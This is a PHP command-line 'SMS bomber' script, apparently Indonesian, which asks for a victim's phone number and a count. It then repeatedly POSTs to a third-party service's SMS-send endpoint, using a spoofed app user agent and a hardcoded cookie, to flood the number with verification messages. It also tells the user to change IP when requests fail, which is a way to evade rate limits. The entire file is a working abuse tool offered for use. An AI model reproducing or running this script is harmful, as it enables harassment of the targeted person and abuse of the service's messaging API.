<?php
/// Spam3R ///
/// Please don't recode this script ///
$pesan="GUNAKAN DENGAN BIJAK";
//warna
$biru="\033[1;34m";
$turkis="\033[1;36m";
$ijo="\033[92m";
$putih="\033[1;37m";
$pink="\033[1;35m";
$red="\033[1;31m";
$kuning="\033[1;33m";

function bom($hp){
$data = array("mobile" => $hp); $data_string = json_encode($data);
$ch = curl_init('https://ai.caping.co.id/v2/sms/send');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 4A Build/OPM7.181105.004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36;CapingNews/4.1.5');
curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);curl_setopt($ch, CURLOPT_HTTPHEADER, array('Cookie: u=61649310;n=000000007b627328fffffffff1110836','Content-Type: application/json','Content-Length: 26','NETWORKSTATE: FouthG','User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; Redmi 4A Build/OPM7.181105.004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36;CapingNews/4.1.5'));
$result = curl_exec($ch);
curl_close($ch);
echo $result;
echo "\n";
}
system('clear');
print"$ijo
 ___  _                      _
|  _ \| |__  _ __ ___  __ _| | _____ _ __
| |_) | '_ \| '__/ _ \/ _` | |/ / _ \ '__|
|  __/| | | | | |  __/ (_| |   <  __/ |
|_|   |_| |_|_|  \___|\__,_|_|\_\___|_|
 \n";
echo " S P 4 M 3 R\n";
echo "____________________\n\n";
echo "$kuning Pesan : $pesan \n\n";
echo "$red Jika GAGAL,,silahkan ubah IP Anda\n";
echo "$putih Nomor dimulai dari 62..\nMasukkan Nomor\t: ";
$no = trim(fgets(STDIN));
echo "$turkis Jumlah  Bom\t: ";
$jumlah = trim(fgets(STDIN));
$i=0;
while($i<$jumlah)
    {
			sleep(1);
			$i++;
		    bom($no);
	};
?>
